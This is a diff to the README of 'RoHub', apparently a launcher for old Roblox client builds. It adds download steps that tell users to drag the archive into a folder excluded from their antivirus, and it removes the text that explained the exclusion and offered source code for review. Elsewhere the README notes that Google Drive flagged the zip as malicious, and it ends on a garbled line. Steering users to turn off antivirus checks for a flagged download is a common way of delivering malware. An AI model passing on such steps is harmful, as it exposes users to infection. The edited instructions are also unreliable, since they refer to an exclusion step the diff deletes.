@@ -18,6 +18,21 @@ unlike Roblox Filtering Disabled, when i tried uploading the zip to google drive
 it got flagged as malicious and blocked sharing the zip file to others, 
 it did not happen when i tried to upload RBLXHub (RoHub) to drive 
 
+## Downloading Instructions
+
+**Prerequisites**
+Ensure you have an archive tool installed:
+* **7-Zip** (64-bit or 32-bit/x86)
+* **WinRAR**
+*(Windows 11 users can use the built-in zip viewer if preferred)*
+
+**Steps**
+1. Download the file [Link]
+2. Wait for the download to finish
+3. Open the zip file
+4. Drag the **RoHub** folder into the folder you previously excluded in your antivirus
+5. When extraction finishes, you may proceed to the second step
+
 ## Hosting Your Own Game
 
 To allow other users to connect to your webserver and join your game, you have two options
@@ -52,25 +67,5 @@ To join someone else's host, go to the **#hosting-channel** and look for the con
     * Copy the ip and port into the "Join" Page of the launcher
     * Select the client (like 2019M) on the list
 3.  **Connect:** Click the join button
-
-## ⚠️ Important Installation Steps
-
-**Before downloading, you must set up an exclusion**
-
-1. Create a new folder on your computer
-2. Open your antivirus software and go to **Exclusions**
-3. Add the folder you just created
-4. Apply the changes
-*(Search "how to add exclusions in [your antivirus name]" if you need help)*
-
-**Why is this required?**
-The download contains files that trigger false positives:
-* **Unsigned Clients** (patched by local_rcc for semi-modern clients)
-* **AutoIt Launcher** (compiled by me)
-
-If you do not add the exclusion, your antivirus will likely flag these programs
-
-**Transparency:**
-If you are concerned about the launcher, I have provided the source code so you can verify it yourself
 
 x64 in x32 click now done virus??
